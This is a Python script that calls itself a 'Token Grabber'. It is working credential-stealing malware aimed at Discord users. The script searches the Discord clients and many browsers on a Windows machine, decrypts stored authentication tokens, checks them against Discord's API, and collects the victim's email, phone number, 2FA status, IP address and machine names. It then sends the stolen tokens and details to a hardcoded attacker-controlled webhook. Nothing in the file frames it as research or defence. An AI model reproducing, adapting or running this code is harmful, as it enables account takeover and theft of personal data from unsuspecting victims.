import os
import json
import requests
from base64 import b64decode
from Crypto.Cipher import AES
from datetime import datetime
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE

tokens = []
cleaned = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "/Google/Chrome/User Data/Default"
    paths = {
        'Discord': roaming + '/discord',
        'Discord Canary': roaming + '/discordcanary',
        'Lightcord': roaming + '/Lightcord',
        'Discord PTB': roaming + '/discordptb',
        'Opera': roaming + '/Opera Software/Opera Stable',
        'Opera GX': roaming + '/Opera Software/Opera GX Stable',
        'Amigo': local + '/Amigo/User Data',
        'Torch': local + '/Torch/User Data',
        'Kometa': local + '/Kometa/User Data',
        'Orbitum': local + '/Orbitum/User Data',
        'CentBrowser': local + '/CentBrowser/User Data',
        '7Star': local + '/7Star/7Star/User Data',
        'Sputnik': local + '/Sputnik/Sputnik/User Data',
        'Vivaldi': local + '/Vivaldi/User Data/Default',
        'Chrome SxS': local + '/Google/Chrome SxS/User Data',
        'Chrome': chrome,
        'Epic Privacy Browser': local + '/Epic Privacy Browser/User Data',
        'Microsoft Edge': local + '/Microsoft/Edge/User Data/Default',
        'Uran': local + '/uCozMedia/Uran/User Data/Default',
        'Yandex': local + '/Yandex/YandexBrowser/User Data/Default',
        'Brave': local + '/BraveSoftware/Brave-Browser/User Data/Default',
        'Iridium': local + '/Iridium/User Data/Default'
    }
    
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        try:
            with open(os.path.join(path, "Local State"), "r") as file:
                key = json.loads(file.read())['os_crypt']['encrypted_key']
        except:
            continue
        
        for file_name in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
            if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
                continue
            
            try:
                with open(os.path.join(path, "Local Storage", "leveldb", file_name), "r", errors='ignore') as files:
                    for line in files.readlines():
                        line.strip()
                        for token_value in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(token_value)
            except PermissionError:
                continue
        
        for token in tokens:
            if token.endswith("\\"):
                token.replace("\\", "")
            elif token not in cleaned:
                cleaned.append(token)
        
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError:
                continue
            
            headers = {'Authorization': tok, 'Content-Type': 'application/json'}
            try:
                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
            except:
                continue
            
            if res.status_code == 200:
                res_json = res.json()
                ip = getip()
                pc_username = os.getenv("UserName")
                pc_name = os.getenv("COMPUTERNAME")
                user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                user_id = res_json['id']
                email = res_json['email']
                phone = res_json['phone']
                mfa_enabled = res_json['mfa_enabled']
                has_nitro = False

                try:
                    res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                    nitro_data = res.json()
                    has_nitro = bool(len(nitro_data) > 0)
                    days_left = 0
                    if has_nitro:
                        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        days_left = abs((d2 - d1).days)
                except:
                    pass

                embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                
                payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                try:
                    headers2 = {
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                    }
                    req = Request('https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm', data=payload.encode(), headers=headers2)
                    urlopen(req)
                except:
                    continue

if __name__ == '__main__':
    get_token()
